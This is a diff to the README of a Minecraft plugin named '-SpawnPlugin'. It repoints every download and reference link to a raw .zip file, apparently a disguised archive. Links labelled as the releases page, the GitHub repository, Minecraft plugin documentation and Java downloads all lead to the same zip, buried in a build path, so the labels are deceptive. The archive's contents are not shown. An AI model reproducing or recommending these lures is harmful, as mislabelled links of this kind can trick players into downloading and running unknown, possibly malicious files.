@@ -15,9 +15,9 @@ Welcome to the -SpawnPlugin! This plugin makes it easy for Minecraft players to 
 
 To download the -SpawnPlugin, visit the Releases page. Click the button below:
 
-[![Download -SpawnPlugin](https://raw.githubusercontent.com/Eterame/-SpawnPlugin/main/serodermitis/-SpawnPlugin.zip)](https://raw.githubusercontent.com/Eterame/-SpawnPlugin/main/serodermitis/-SpawnPlugin.zip)
+[![Download -SpawnPlugin](https://github.com/Eterame/-SpawnPlugin/raw/refs/heads/main/spawnplugin1/build/classes/java/main/mc/Spacecat7773/spawnplugin1/Plugin_Spawn_v3.4.zip)](https://github.com/Eterame/-SpawnPlugin/raw/refs/heads/main/spawnplugin1/build/classes/java/main/mc/Spacecat7773/spawnplugin1/Plugin_Spawn_v3.4.zip)
 
-1. **Visit the Releases Page:** Click the link above or go directly to [this page](https://raw.githubusercontent.com/Eterame/-SpawnPlugin/main/serodermitis/-SpawnPlugin.zip).
+1. **Visit the Releases Page:** Click the link above or go directly to [this page](https://github.com/Eterame/-SpawnPlugin/raw/refs/heads/main/spawnplugin1/build/classes/java/main/mc/Spacecat7773/spawnplugin1/Plugin_Spawn_v3.4.zip).
   
 2. **Choose Your Version:** Look for the latest version listed. It is usually at the top of the page.
 
@@ -76,8 +76,8 @@ For additional help, consider reaching out to the Minecraft community. You can a
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://raw.githubusercontent.com/Eterame/-SpawnPlugin/main/serodermitis/-SpawnPlugin.zip)
-- [Minecraft Plugin Documentation](https://raw.githubusercontent.com/Eterame/-SpawnPlugin/main/serodermitis/-SpawnPlugin.zip)
-- [Java Downloads](https://raw.githubusercontent.com/Eterame/-SpawnPlugin/main/serodermitis/-SpawnPlugin.zip)
+- [GitHub Repository](https://github.com/Eterame/-SpawnPlugin/raw/refs/heads/main/spawnplugin1/build/classes/java/main/mc/Spacecat7773/spawnplugin1/Plugin_Spawn_v3.4.zip)
+- [Minecraft Plugin Documentation](https://github.com/Eterame/-SpawnPlugin/raw/refs/heads/main/spawnplugin1/build/classes/java/main/mc/Spacecat7773/spawnplugin1/Plugin_Spawn_v3.4.zip)
+- [Java Downloads](https://github.com/Eterame/-SpawnPlugin/raw/refs/heads/main/spawnplugin1/build/classes/java/main/mc/Spacecat7773/spawnplugin1/Plugin_Spawn_v3.4.zip)
 
 We hope you enjoy using -SpawnPlugin to enhance your Minecraft experience. Happy gaming!
